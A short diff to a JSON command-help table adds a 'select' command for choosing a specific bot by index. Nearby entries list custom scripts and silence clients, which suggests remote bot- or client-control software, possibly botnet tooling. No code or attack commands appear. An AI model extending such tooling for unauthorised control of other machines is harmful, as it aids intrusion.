@@ -29,6 +29,11 @@
         "functionality":"Lists custom scripts you have",
         "usage":"scripts"
     },
+	{
+        "command":"select",
+        "functionality":"Select a specific bot",
+        "usage":"select (index)"
+	},
     {
         "command":"silent",
         "functionality":"Silents clients from responding",
